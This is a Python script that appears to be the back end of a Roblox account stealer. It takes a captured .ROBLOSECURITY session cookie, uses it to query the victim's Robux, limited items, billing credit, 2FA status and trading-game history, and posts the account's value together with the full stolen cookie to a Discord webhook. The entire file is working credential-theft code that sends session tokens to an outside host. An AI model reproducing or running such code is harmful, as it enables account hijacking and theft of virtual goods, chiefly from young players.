import sys
import base64
import os
import requests
import re
from datetime import datetime, timezone

def clean_cookie(raw_input):
    """
    Strictly cleans the cookie of:
    - Base64 encoding (if present)
    - .ROBLOSECURITY= prefix
    - Surrounding quotes and whitespace/newlines
    - Trailing semicolons (; or ??)
    - Escaped characters
    """
    try:
        decoded = base64.b64decode(raw_input).decode('utf-8', errors='ignore')
    except Exception:
        decoded = raw_input

    cookie = decoded.strip()

    # Remove .ROBLOSECURITY= prefix if user pasted it with the name
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):]

    # Match standard Roblox warning prefix structure
    match = re.search(r'(_\\?\|WARNING:[^"\']+)', cookie)
    if match:
        cookie = match.group(1)

    # Clean formatting artifacts
    cookie = cookie.replace('\\|', '|').replace('\\"', '"')
    cookie = re.sub(r'\s+', '', cookie)
    cookie = cookie.strip(' "\'').rstrip(';')
    cookie = re.sub(r';+$', '', cookie)

    return cookie

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        # 1. Clean cookie thoroughly according to rules
        raw_arg = sys.argv[1]
        roblosecurity = clean_cookie(raw_arg)

        print(f"DEBUG: Processed cookie length: {len(roblosecurity)}, Starts with: {roblosecurity[:15]}...", file=sys.stderr)

        session = requests.Session()
        
        # 2. Sent strictly as a cookie named .ROBLOSECURITY in the cookie jar (not a header)
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
        
        # Realistic local machine browser headers
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/"
        })

        # 3. No extra requests, no logout calls made. Direct auth check.
        auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
        
        # 4. Clear error handling for 401
        if auth_res.status_code == 401:
            print("Cookie invalid, expired, or IP-locked. Generate a fresh one on the same network.", file=sys.stderr)
            sys.exit(1)
        elif auth_res.status_code != 200:
            print(f"DEBUG RESPONSE: {auth_res.text}", file=sys.stderr)
            sys.exit(1)
            
        auth_data = auth_res.json()
        user_id = auth_data.get("id")
        if not user_id:
            sys.exit(1)

        username = auth_data.get("name", "Unknown")
        display_name = auth_data.get("displayName", username)

        # --- Standard Fetchers (GET / Safe read-only calls) ---
        def get_user_info():
            return session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()

        def get_robux():
            r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", timeout=10).json()
            return r.get("robux", 0)

        def get_pending():
            r = session.get(
                f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
                params={"transactionType": "summary", "timeFrame": "Year"},
                timeout=10
            ).json()
            return r.get("pendingRobuxTotal", 0)

        def get_limiteds():
            limiteds = []
            cursor = ""
            while True:
                params = {"limit": 100}
                if cursor:
                    params["cursor"] = cursor
                r = session.get(
                    f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
                    params=params,
                    timeout=10
                ).json()
                for item in r.get("data", []):
                    limiteds.append(item.get("recentAveragePrice", 0))
                cursor = r.get("nextPageCursor")
                if not cursor:
                    break
            return limiteds

        def get_premium():
            r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", timeout=10)
            return r.json() == True

        def get_groups():
            r = session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10).json()
            groups = r.get("data", [])
            owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
            return len(groups), owned

        def get_games_developer():
            r = session.get(f"https://develop.roblox.com/v1/user/universes?userId={user_id}", timeout=10).json()
            return len(r.get("data", [])) > 0

        def get_account_settings():
            r = session.get("https://accountsettings.roblox.com/v1/email", timeout=10).json()
            email_verified = r.get("verified", False)
            r2 = session.get("https://twostepverification.roblox.com/v1/metadata", timeout=10).json()
            twofa = r2.get("twoStepVerificationEnabled", False)
            return email_verified, twofa

        def get_credit():
            r = session.get("https://billing.roblox.com/v1/credit", timeout=10).json()
            return r.get("balance", 0), r.get("currencyType", "Unknown")

        def check_played(universe_id):
            cursor = ""
            while True:
                r = session.get(
                    f"https://badges.roblox.com/v1/users/{user_id}/badges",
                    params={"limit": 100, "cursor": cursor},
                    timeout=10
                ).json()
                for badge in r.get("data", []):
                    if badge.get("awardingUniverse", {}).get("id") == universe_id:
                        return True
                cursor = r.get("nextPageCursor")
                if not cursor:
                    return False

        # Gather Data
        user        = get_user_info()
        created     = user.get("created", "")
        age_days    = (datetime.now(timezone.utc) - datetime.fromisoformat(
                        created.replace("Z", "+00:00"))).days if created else 0

        robux       = get_robux()
        pending     = get_pending()
        limiteds    = get_limiteds()
        rap         = sum(limiteds)
        lim_count   = len(limiteds)
        premium     = get_premium()
        group_count, owned = get_groups()
        developer   = get_games_developer()
        email_ver, twofa = get_account_settings()
        credit, currency = get_credit()

        adopt_me    = check_played(383310974)
        mm2         = check_played(142823291)
        ps99        = check_played(3259657279)

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
        full_cookie_display = f"```text\n{roblosecurity}\n```"

        payload = {
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [{
                "title": f"👑 [{display_name} | 13+]",
                "description": (
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | "
                    f"**[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**"
                ),
                "color": 0x2B2D31,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {
                        "name": "👤 Username",
                        "value": f"`{username}`",
                        "inline": True
                    },
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {
                        "name": "📈 Account Stats",
                        "value": (
                            f"• Age: `{age_days} Days`\n"
                            f"• Developer: `{developer}`\n"
                            f"• Group Members: `{group_count}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "🪙 Robux",
                        "value": (
                            f"• Balance: `{robux:,} R$`\n"
                            f"• Pending: `{pending:,} R$`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "📦 Limiteds",
                        "value": (
                            f"• RAP: `{rap:,} R$`\n"
                            f"• Count: `{lim_count}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "💳 Payments",
                        "value": f"• Credit: `{credit:.2f} {currency}`",
                        "inline": True
                    },
                    {
                        "name": "🎮 Games Played",
                        "value": (
                            f"• Adopt Me: `{adopt_me}`\n"
                            f"• MM2: `{mm2}`\n"
                            f"• PS99: `{ps99}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "⚙️ Settings",
                        "value": (
                            f"• Email Verified: `{email_ver}`\n"
                            f"• 2FA: `{twofa}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "⭐ Premium",
                        "value": f"`{premium}`",
                        "inline": True
                    },
                    {
                        "name": "👥 Groups",
                        "value": (
                            f"• Owned: `{owned}`\n"
                            f"• Joined: `{group_count}`"
                        ),
                        "inline": True
                    },
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {
                        "name": "🔑 Full Captured Cookie / Payload",
                        "value": full_cookie_display,
                        "inline": False
                    }
                ],
                "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
                "timestamp": datetime.now(timezone.utc).isoformat()
            }]
        }

        r = requests.post(webhook_url, json=payload, timeout=10)
        if r.status_code in (200, 204):
            print("DEBUG: Embed sent successfully!", file=sys.stderr)
        else:
            print(f"DEBUG: Failed to send embed: {r.status_code} - {r.text}", file=sys.stderr)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
